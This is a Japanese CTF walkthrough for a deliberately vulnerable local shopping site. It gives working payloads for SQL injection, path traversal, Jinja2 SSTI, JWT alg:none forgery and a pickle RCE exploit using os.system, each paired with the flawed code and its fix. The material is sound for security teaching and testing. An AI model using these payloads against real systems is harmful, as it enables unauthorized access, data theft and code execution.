## 問題1: トップページの情報漏えい

対象: `http://localhost:8000/`

このECサイトのトップページには、本来ユーザーの目に触れるべきではない情報が残っています。ブラウザの標準機能だけで見つけられます。見つけた `FLAG{...}` 形式の文字列を提出してください。

### ヒント

Webページは、画面に表示されている内容がすべてではありません。

ブラウザにはHTMLの中身をそのまま確認する機能があります。

### 回答（解き方）

1. トップページを開く
2. 右クリックして「ページのソースを表示」を選ぶ（キーボードショートカットは `Ctrl+U`、Macなら `Cmd+Option+U`）
3. `<head>` タグの中にあるHTMLコメントを探す

コメントの中に書かれている文字列が答えです。

### この問題のもとになる脆弱性について

HTMLのコメント（`<!-- -->` で囲まれた部分）は、画面には表示されませんが、ブラウザに送られてくるデータそのものには含まれています。

つまり「見えない」だけで「隠れている」わけではありません。

実際の開発現場でも、デバッグ用のメモや内部URL、担当者の名前などがコメントとして残ったまま本番環境にデプロイされてしまうケースがあります。

パスワードやAPIキーがコメントに書かれていたら、それはもう漏えいしているのと同じです。

対策はシンプルで、**機密情報はそもそもクライアントに送らないこと**です。

サーバー側だけで完結する情報と、ブラウザに渡していい情報を明確に分けて管理する必要があります。

## 問題2: JavaScriptファイルのコメント

対象: `http://localhost:8000/products`

商品一覧ページが読み込んでいるJavaScriptファイルの中に、削除し忘れたコメントがあります。開発者ツールを使って探してください。

### ヒント

ブラウザの開発者ツール（キーボードの `F12`）を開くと、ページが読み込んでいるファイル一覧を確認できます。

NetworkタブでもSourcesタブでも構いません。

### 回答（解き方）

1. 商品一覧ページを開く
2. 開発者ツールを開き、NetworkタブまたはSourcesタブで読み込まれているJSファイルを確認する
3. `products.js` を開いてコメント部分を読む

`curl <http://localhost:8000/static/js/products.js`> でも直接確認できます。

### この問題のもとになる脆弱性について

JavaScriptもHTMLと同じく、ブラウザに送られた時点で中身が丸ごと見えるようになります。

難読化（minify）していても、元の情報が読み取れなくなるわけではありません。

フロントエンドのコードに秘密情報を書いてはいけない、というのは覚えておいて損はないルールです。

APIキーをJavaScriptに直書きしている実装は今でも珍しくありませんが、それは公開しているのと同じ状態です。

## 問題3: robots.txtの誤用

対象: `http://localhost:8000/robots.txt`

このサイトのどこかに、検索エンジンには見つけてほしくないページがあるようです。

そのページの場所は、あるファイルに書かれています。

### ヒント

検索エンジンのクローラーに「ここは巡回しないでください」と伝えるための設定ファイルがWebサイトには存在します。

### 回答（解き方）

1. `http://localhost:8000/robots.txt` にアクセスする
2. `Disallow` に書かれているパスを確認する
3. そのパスに直接アクセスする

```
curl <http://localhost:8000/robots.txt>
curl <http://localhost:8000/><Disallowに書かれていたパス>
```

### この問題のもとになる脆弱性について

`robots.txt` は検索エンジンのクローラーに向けたお願いであって、アクセス制限の仕組みではありません。

書いてあるパスにアクセスするなとは、クローラーには効きますが人間には何の効力もありません。

むしろ「ここに何かある」と教えてしまっているとも言えます。

このパターンは「Security through obscurity」と呼ばれます。

隠しておけば安全だろうという考え方ですが、URLを知っている人なら誰でもアクセスできてしまう以上、実質的に対策になっていません。

本当に守りたいページの場合、ログイン認証や権限チェックをサーバー側で行う必要があります。

## 問題4: Cookieによるアクセス制御

対象: `http://localhost:8000/mypage` → `http://localhost:8000/store-admin`

`customer1` / `password123` でログインすると、Cookieが発行されます。

そのCookieの中身と、`/store-admin` にアクセスしたときの挙動の関係を調べてください。

### ヒント

ログイン後に発行されているCookieを開発者ツールで確認してみてください。

値を書き換えたら何が起きるか、試してみましょう。

### 回答(解き方)

1. `customer1` / `password123` でログインする
2. 開発者ツールのApplication（またはStorage）タブでCookieを確認する。`role` というCookieが `user` になっているはずです
3. `role` の値を `admin` に書き換えて `/store-admin` にアクセスする

curlでも再現できます。

```
curl -b "session=<ログイン後のsession値>; role=admin" <http://localhost:8000/store-admin>
```

### この問題のもとになる脆弱性について

Cookieはブラウザ側に保存されるデータで、基本的にユーザーが自由に書き換えられます。

この問題のアプリは、その書き換え可能なCookieの値だけを見て「この人は管理者かどうか」を判断していました。

権限の判定は、必ずサーバー側で信頼できる情報を元に行う必要があります。

Flaskには署名付きセッション（`session`）という仕組みがあり、これを使えば値を書き換えても署名検証で弾かれます。

今回のアプリはあえて署名なしの生Cookieを使うことで、この脆弱性を再現しています。

現実のWebアプリでも「クライアントから送られてきた値をそのまま信用する」実装は事故のもとです。

ユーザーの権限やIDのような重要な情報は、サーバー側のセッションやデータベースを正として扱ってください。

## 問題5: SQLインジェクションによる認証バイパス

対象: `http://localhost:8000/login`

ログインフォームのユーザー名欄は、思っているより自由度の高い入力を受け付けてしまうようです。パスワードを知らなくてもログインできる方法を探してください。

### ヒント

ログイン処理の裏側では、入力されたユーザー名とパスワードを使ってデータベースへの問い合わせ文（SQL文）が組み立てられています。

その組み立て方に注目してください。

### 回答（解き方）

ユーザー名欄に次の文字列を入力し、パスワードは何でもよいので入力してログインします。

```sql
' OR '1'='1' --
```

（末尾のスペースも含めて入力してください）

curlでも試せます。

```
curl -i -c cookies.txt --data-urlencode "username=' OR '1'='1' -- " -d "password=x" <http://localhost:8000/login>
```

ログインに成功するとマイページに移動します。「お届け先住所」欄にフラグが表示されます。

### この問題のもとになる脆弱性について

このアプリのログイン処理は、次のようなコードでSQL文を組み立てていました。

```python
query = f"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'"
```

ユーザーが入力した文字列をそのままSQL文に埋め込んでいるため、`'` や `--`（SQLのコメント記号）を含む入力によって、SQL文の構造そのものを変えられてしまいます。

`' OR '1'='1' --`  を入力すると、実際に実行されるSQL文は次のようになります。

```sql
SELECT * FROM users WHERE username = '' OR '1'='1' -- ' AND password = 'x'
```

`-`  より後ろはコメント扱いになるのでパスワードのチェックごと無視され、`OR '1'='1'` が常に真になるので全ユーザーが条件に一致してしまいます。

これがSQLインジェクションです。

対策は、SQL文の組み立てに文字列結合を使わず、プレースホルダを使ったパラメータ化クエリ（プリペアドステートメント）を使うことです。

Pythonの `sqlite3` であれば次のように書きます。

```python
conn.execute("SELECT * FROM users WHERE username = ? AND password = ?", (username, password))
```

これだけで、ユーザーの入力がSQL文の構造に影響を与えることはなくなります。

## 問題6: IDOR（不適切な直接オブジェクト参照）

対象: `http://localhost:8000/orders/<注文番号>`

ログインすると自分の注文履歴を確認できます。注文詳細のURLに含まれる番号を変えてみると、何が起きるか試してください。

### ヒント

`customer1` としてログインした状態で、自分の注文詳細ページのURLを確認してください。URLの末尾は単なる数字です。

### 回答（解き方）

1. `customer1` / `password123` でログインする
2. `/orders` から自分の注文詳細（注文番号1）を開く
3. URLの番号を `2` に変えてアクセスする

```
curl -b cookies.txt <http://localhost:8000/orders/2>
```

自分のものではない注文の詳細が表示され、備考欄にフラグが含まれています。

### この問題のもとになる脆弱性について

このアプリは、ログインしているかどうかは確認していましたが、「アクセスしようとしている注文が、本当にそのユーザー自身のものか」までは確認していませんでした。

URLの番号を変えるだけで他人のデータが見えてしまう、これがIDOR（Insecure Direct Object Reference、不適切な直接オブジェクト参照）と呼ばれる脆弱性です。

考え方はシンプルです。

データベースのIDのような、連番で推測しやすい値を外部に見せている場合、その値を変えられたときに何が起きるかを常に想定しておく必要があります。

正しい実装は、注文を取得したあとに「この注文のuser_idは、今ログインしているユーザーのIDと一致するか」を必ずチェックすることです。

IDORはログイン機能があるアプリでは頻出の脆弱性です。

マイページ、注文、請求書、メッセージなど「自分のデータだけ見えるはずの画面」があれば、そこは常にこの観点で確認する価値があります。

## 問題7: パストラバーサル

対象: `http://localhost:8000/receipts/download`

注文詳細ページから領収書をダウンロードできます。このダウンロード機能はファイル名を指定できる仕組みになっていますが、指定できる範囲に制限はかかっているでしょうか。

### ヒント

ファイル名の指定方法によっては、本来アクセスしてほしくないディレクトリのファイルを読み取れてしまう場合があります。

### 回答（解き方）

ログイン後、`filename` パラメータに次のような値を指定してアクセスします。

```
curl -b cookies.txt --get --data-urlencode "filename=../../secret/flag07.txt" <http://localhost:8000/receipts/download>
```

- `-data-urlencode` を使わずにブラウザのアドレスバーにそのまま入力しても再現できます。

### この問題のもとになる脆弱性について

このアプリのダウンロード処理は、受け取った `filename` をそのままファイルパスの組み立てに使っていました。

```python
path = os.path.join(RECEIPTS_DIR, filename)
```

`filename` に `../../secret/flag07.txt` のような値を渡すと、`../` によって親ディレクトリへ移動できてしまい、本来公開するつもりのなかった `secret/flag07.txt` にたどり着きます。

これがパストラバーサル（ディレクトリトラバーサル）です。

対策はいくつかあります。

- ファイル名に `..` や `/` を含めない、あるいはファイル名を実際のディレクトリ名やIDに変換してから使う
- `os.path.realpath()` で解決した後のパスが想定ディレクトリの配下に収まっているか確認する

etc…

ユーザーの入力を直接ファイルシステムの操作に使うときは、常にこの脆弱性を疑ってください。

## 問題8: サーバーサイドテンプレートインジェクション（SSTI）

対象: 商品詳細ページのレビュー投稿フォーム（お名前欄）

レビューを投稿すると、投稿完了メッセージに入力した名前が表示されます。この表示のされ方を確認してください。

### ヒント

「お名前」欄に、計算結果になるような文字列を入れて投稿してみてください。

### 回答（解き方）

1. 商品詳細ページのレビュー投稿フォームで、お名前欄に `{{7*7}}` と入力して投稿する
2. 完了メッセージに `49さんのレビューを投稿しました。` と表示されることを確認する（単なる文字列表示なら `{{7*7}}` がそのまま出るはずです）
3. お名前欄に `{{ config.FLAG_08 }}` と入力して投稿する

完了メッセージにフラグが表示されます。curlでの再現例は次の通りです。

```
curl -c cookies.txt -b cookies.txt -d "author_name={{ config.FLAG_08 }}&rating=5&comment=x" <http://localhost:8000/products/1/reviews> -L
```

### この問題のもとになる脆弱性について

このアプリのレビュー投稿処理は、入力された名前をテンプレート文字列の一部として組み立て、それをレンダリングしていました。

```python
render_template_string(f"{author_name}さんのレビューを投稿しました。")
```

一見するとただの文字列結合に見えますが、`render_template_string` はJinja2のテンプレートエンジンに文字列を渡して実行する関数です。

ユーザーの入力がテンプレートの「構造」の一部になってしまっているため、`{{ }}` で囲まれた式はJinja2によって評価されます。

`{{7*7}}` が `49` になるのはこのためで、同じ仕組みでサーバー内部の設定値（今回は `config.FLAG_08`）にもアクセスできてしまいます。

これがSSTI（Server-Side Template Injection）です。

深刻なケースでは、Pythonのオブジェクト階層を辿ってサーバー上で任意のコードを実行されることもあります。

対策は、ユーザーの入力を絶対にテンプレートの「構造」に混ぜないことです。

表示したい値がある場合は、テンプレート内で変数として渡してください。

```python
render_template_string("{{ name }}さんのレビューを投稿しました。", name=author_name)
```

このように書けば、`author_name` の中身がどんな文字列であっても、それが単なるデータとして扱われ、テンプレートとして評価されることはなくなります。

## 問題9: JWTの検証不備

### 問題文

対象: `http://localhost:8000/api/login`, `http://localhost:8000/api/admin-dashboard`

このサイトの会員APIはJWT（JSON Web Token）でユーザーを認証しています。`/api/login` にログイン情報を送るとトークンが発行されるので、その中身と検証の仕組みを調べてください。

### ヒント

JWTは3つの部分がドットで区切られた文字列です。

それぞれBase64でエンコードされているだけなので、デコードすれば中身が読めます。

ヘッダー部分にある `alg`（署名アルゴリズム）というフィールドに注目してください。

### 回答（解き方）

1. `/api/login` に `customer1` / `password123` を送ってトークンを取得する
2. トークンをドットで分割し、ヘッダーとペイロードをBase64デコードして中身を確認する
3. ヘッダーの `alg` を `none` に、ペイロードの `role` を `admin` に書き換え、署名部分を空にした新しいトークンを作る
4. そのトークンで `/api/admin-dashboard` にアクセスする

トークン作成の例（Python）です。

```python
import json, base64

def b64url(data):
    return base64.urlsafe_b64encode(data).rstrip(b"=")

header = b64url(json.dumps({"typ": "JWT", "alg": "none"}).encode())
payload = b64url(json.dumps({"user_id": 1, "username": "x", "role": "admin"}).encode())
token = (header + b"." + payload + b".").decode()
print(token)
```

```
curl -H "Authorization: Bearer <上記のトークン>" <http://localhost:8000/api/admin-dashboard>
```

### この問題のもとになる脆弱性について

JWTは「ヘッダー.ペイロード.署名」という3つの部分から構成されます。

ヘッダーとペイロードはただのBase64エンコードなので誰でも読めますし、書き換えることもできます。

それでも改ざんが検知できるのは、署名がサーバーの秘密鍵で作られており、サーバー以外には正しい署名を作れないからです。

このアプリの検証処理には、次のような分岐がありました。

```python
header = jwt.get_unverified_header(token)
if header.get("alg", "").lower() == "none":
    return jwt.decode(token, options={"verify_signature": False}, algorithms=["none"])
```

トークンの `alg` が `none` だった場合、署名検証そのものをスキップしてしまいます。

JWTの `alg` はトークンを送ってきた側（つまり攻撃者）が自由に書き換えられる値なので、これでは署名の意味がなくなります。

攻撃者は署名部分を空にしたうえで `alg: none` を名乗るだけで、中身を自由に偽装したトークンを通せてしまいます。

これは実際に過去のJWTライブラリで発見された脆弱性で、`alg: none` 攻撃として知られています。

対策は、サーバー側で使用するアルゴリズムを固定し、トークン側から送られてきた `alg` を信用しないことです。

`jwt.decode()` を呼ぶときに `algorithms=["HS256"]` のように許可するアルゴリズムを明示的に指定し、それ以外は問答無用で拒否する実装にする必要があります。

## 問題10: 安全でないデシリアライゼーション

### 問題文

対象: `http://localhost:8000/cart/backup`, `http://localhost:8000/cart/restore`

カートの中身はバックアップとして保存し、後から復元できます。

バックアップデータの形式と、復元処理が何をしているかを調べてください。

### ヒント

バックアップデータをダウンロードしてBase64デコードすると、Pythonの `pickle` 形式のバイナリが出てきます。`pickle` はただのデータ形式ではなく、復元時に任意のオブジェクトを再構築できる仕組みを持っています。

### 回答（解き方）

`__reduce__` メソッドを使って、復元時に任意のコマンドが実行されるオブジェクトを作ります。

```python
import pickle, base64, os

class Exploit:
    def __reduce__(self):
        return (os.system, ("cat /app/secret/flag10.txt > /tmp/output",))

payload = base64.b64encode(pickle.dumps(Exploit())).decode()
print(payload)
```

生成した文字列を `backup_data` として送信します。

```
curl -c cookies.txt -b cookies.txt --data-urlencode "backup_data=<上記の出力>" <http://localhost:8000/cart/restore> -L
```

`/cart` ページを開くと、実行結果としてフラグが表示されます。`--data-urlencode` を使わないとBase64のパディングが壊れて失敗するので注意してください。

### この問題のもとになる脆弱性について

`pickle` はPythonのオブジェクトをバイト列に変換・復元するための標準ライブラリです

便利な反面、`pickle.loads()` は「このオブジェクトを作るには、この関数をこの引数で呼び出してください」という指示までバイト列に含めて復元できてしまいます。

このアプリの復元処理は、ユーザーが送ってきたバイト列をそのまま `pickle.loads()` に渡していました。

```python
restored = pickle.loads(base64.b64decode(data))
```

攻撃者が `__reduce__` メソッドを実装したオブジェクトを送ると、そのオブジェクトが復元される瞬間に、指定した関数（今回は `os.system`）が指定した引数で呼び出されます。

つまりデータを送っただけで、サーバー上で任意のコードが実行されてしまいます。

これが安全でないデシリアライゼーション（Insecure Deserialization）です。

`pickle` に限らず、復元時に任意のコードを実行できるシリアライズ形式は同じ危険性を持ちます。

信頼できない入力を扱う場合は、`pickle` ではなく `JSON` のようにデータの表現力しか持たないフォーマットを使ってください。

どうしても `pickle` を使う必要がある場合でも、外部から受け取ったデータをそのまま `pickle.loads()` に渡すことは避けるべきです。
